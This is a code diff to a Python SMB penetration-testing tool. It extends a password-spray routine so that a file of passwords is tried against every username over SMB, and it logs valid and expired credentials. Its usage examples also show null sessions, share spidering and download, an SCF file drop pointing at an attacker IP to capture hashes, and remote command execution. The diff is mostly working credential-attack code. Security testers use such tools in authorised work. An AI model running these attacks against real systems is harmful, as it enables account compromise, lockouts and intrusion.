@@ -97,7 +97,7 @@ def build_argparser() -> argparse.ArgumentParser:
             "  %(prog)s 10.0.0.5 --null-session --smb-version SMBv1\n"
             "  %(prog)s 10.0.0.5 -u admin -p Pass1 --spider --download --json report.json\n"
             "  %(prog)s 10.0.0.5 --users --spray --spray-password Winter2024!\n"
-            "  %(prog)s 10.0.0.5 -u admin -p Pass1 --spray --spray-users users.txt --spray-password Welcome1\n"
+            "  %(prog)s 10.0.0.5 -u admin -p Pass1 --spray --spray-users users.txt --spray-passwords passwords.txt\n"
             "  %(prog)s 10.0.0.5 -u admin -p Pass1 --scf-drop --attacker-ip 192.168.1.99 --scf-cleanup\n"
             "  %(prog)s 10.0.0.5 -u admin -p Pass1 --exec 'whoami /all'\n"
         ),
@@ -209,7 +209,7 @@ def build_argparser() -> argparse.ArgumentParser:
     spray_grp = parser.add_argument_group("password spray")
     spray_grp.add_argument(
         "--spray", action="store_true", default=False,
-        help="Spray a single password across multiple usernames (one attempt per account).",
+        help="Spray password(s) across multiple usernames (one attempt per account per password).",
     )
     spray_grp.add_argument(
         "--spray-users", metavar="FILE", default=None,
@@ -218,6 +218,10 @@ def build_argparser() -> argparse.ArgumentParser:
     spray_grp.add_argument(
         "--spray-password", default=None,
         help="Password to spray. Falls back to -p if omitted.",
+    )
+    spray_grp.add_argument(
+        "--spray-passwords", metavar="FILE", default=None,
+        help="File of passwords to spray, one per line. Overrides --spray-password.",
     )
     spray_grp.add_argument(
         "--spray-delay", type=float, default=1.0,
@@ -1055,11 +1059,11 @@ class SMBAuditor:
     def password_spray(
         self,
         usernames: list[str],
-        password: str,
+        passwords: list[str],
         delay: float = 1.0,
     ) -> list[dict]:
         """
-        Spray a single password across a list of usernames.
+        Spray one or more passwords across a list of usernames.
 
         Opens a fresh SMBConnection per attempt to avoid state bleed on the
         main connection.  Lockout-aware: if a lockout is detected the account
@@ -1070,73 +1074,77 @@ class SMBAuditor:
         """
         results: list[dict] = []
         total = len(usernames)
+        total_passwords = len(passwords)
 
         _console.print(
             f"\n[bold cyan]Password Spray[/bold cyan]  "
-            f"[dim]{total} user(s) | password: {password} | delay: {delay}s[/dim]"
+            f"[dim]{total} user(s) | {total_passwords} password(s) | delay: {delay}s[/dim]"
         )
 
-        for idx, username in enumerate(usernames, 1):
-            status = "invalid"
-            try:
-                conn = SMBConnection(
-                    self.target, self.target,
-                    sess_port=self.port,
-                    timeout=self.timeout,
-                )
-                conn.login(
-                    username, password,
-                    domain=self.domain,
-                    lmhash=self.lmhash,
-                    nthash=self.nthash,
-                )
-                status = "success"
-                logging.warning("[SPRAY] VALID: %s\\%s : %s", self.domain, username, password)
+        for p_idx, password in enumerate(passwords, 1):
+            if total_passwords > 1:
+                _console.print(f"\n  [bold]Spraying password ({p_idx}/{total_passwords}):[/bold] {password}")
+            for idx, username in enumerate(usernames, 1):
+                status = "invalid"
                 try:
-                    conn.logoff()
-                    conn.close()
-                except Exception:
-                    pass
-
-            except SessionError as exc:
-                code = exc.getErrorCode()
-                if code == _ACCOUNT_LOCKED:
-                    status = "locked_out"
-                    logging.warning("[SPRAY] LOCKED: %s\\%s", self.domain, username)
-                elif code == _ACCOUNT_DISABLED:
-                    status = "disabled"
-                    logging.debug("[SPRAY] DISABLED: %s", username)
-                elif code == _PASSWORD_EXPIRED:
-                    # Expired password still confirms the account exists with that credential.
-                    status = "expired"
-                    logging.warning(
-                        "[SPRAY] EXPIRED (potential valid): %s\\%s : %s",
-                        self.domain, username, password,
+                    conn = SMBConnection(
+                        self.target, self.target,
+                        sess_port=self.port,
+                        timeout=self.timeout,
                     )
-                else:
-                    status = "invalid"
-                    logging.debug("[SPRAY] FAIL: %s | 0x%08x", username, code)
+                    conn.login(
+                        username, password,
+                        domain=self.domain,
+                        lmhash=self.lmhash,
+                        nthash=self.nthash,
+                    )
+                    status = "success"
+                    logging.warning("[SPRAY] VALID: %s\\%s : %s", self.domain, username, password)
+                    try:
+                        conn.logoff()
+                        conn.close()
+                    except Exception:
+                        pass
 
-            except Exception as exc:
-                logging.debug("[SPRAY] Connection error for %s: %s", username, exc)
-                status = "error"
+                except SessionError as exc:
+                    code = exc.getErrorCode()
+                    if code == _ACCOUNT_LOCKED:
+                        status = "locked_out"
+                        logging.warning("[SPRAY] LOCKED: %s\\%s", self.domain, username)
+                    elif code == _ACCOUNT_DISABLED:
+                        status = "disabled"
+                        logging.debug("[SPRAY] DISABLED: %s", username)
+                    elif code == _PASSWORD_EXPIRED:
+                        # Expired password still confirms the account exists with that credential.
+                        status = "expired"
+                        logging.warning(
+                            "[SPRAY] EXPIRED (potential valid): %s\\%s : %s",
+                            self.domain, username, password,
+                        )
+                    else:
+                        status = "invalid"
+                        logging.debug("[SPRAY] FAIL: %s | 0x%08x", username, code)
 
-            record = {"username": username, "password": password, "status": status}
-            results.append(record)
+                except Exception as exc:
+                    logging.debug("[SPRAY] Connection error for %s: %s", username, exc)
+                    status = "error"
 
-            indicator = {
-                "success":    "[green]HIT    [/green]",
-                "expired":    "[yellow]EXPIRED[/yellow]",
-                "locked_out": "[yellow]LOCKED [/yellow]",
-                "disabled":   "[dim]DISABLED[/dim]",
-                "invalid":    "[dim]  .    [/dim]",
-                "error":      "[red]ERR    [/red]",
-            }.get(status, "[dim]  .    [/dim]")
+                record = {"username": username, "password": password, "status": status}
+                results.append(record)
 
-            _console.print(f"  [{idx:>4}/{total}]  {indicator}  {username}", highlight=False)
+                indicator = {
+                    "success":    "[green]HIT    [/green]",
+                    "expired":    "[yellow]EXPIRED[/yellow]",
+                    "locked_out": "[yellow]LOCKED [/yellow]",
+                    "disabled":   "[dim]DISABLED[/dim]",
+                    "invalid":    "[dim]  .    [/dim]",
+                    "error":      "[red]ERR    [/red]",
+                }.get(status, "[dim]  .    [/dim]")
 
-            if idx < total:
-                time.sleep(delay)
+                _console.print(f"  [{idx:>4}/{total}]  {indicator}  {username}", highlight=False)
+
+                if p_idx < total_passwords or idx < total:
+                    time.sleep(delay)
 
         hits = [r for r in results if r["status"] in ("success", "expired")]
         _console.print(
@@ -2019,10 +2027,20 @@ def main() -> None:
 
         # -- Password spray ----------------------------------------------
         if args.spray:
-            spray_password = args.spray_password or args.password
-            if not spray_password:
-                logging.error("--spray requires a password via --spray-password or -p.")
-                sys.exit(1)
+            spray_passwords = []
+            if args.spray_passwords:
+                try:
+                    with open(args.spray_passwords, encoding="utf-8") as fh:
+                        spray_passwords = [line.strip() for line in fh if line.strip()]
+                except OSError as exc:
+                    logging.error("Cannot read spray passwords file: %s", exc)
+                    sys.exit(1)
+            else:
+                spray_password = args.spray_password or args.password
+                if not spray_password:
+                    logging.error("--spray requires a password via --spray-passwords, --spray-password, or -p.")
+                    sys.exit(1)
+                spray_passwords = [spray_password]
 
             if args.spray_users:
                 try:
@@ -2042,7 +2060,7 @@ def main() -> None:
             if not usernames:
                 logging.error("No usernames available for spray. Use --spray-users FILE.")
             else:
-                auditor.password_spray(usernames, spray_password, delay=args.spray_delay)
+                auditor.password_spray(usernames, spray_passwords, delay=args.spray_delay)
 
         # -- SCF hash capture --------------------------------------------
         if args.scf_drop:
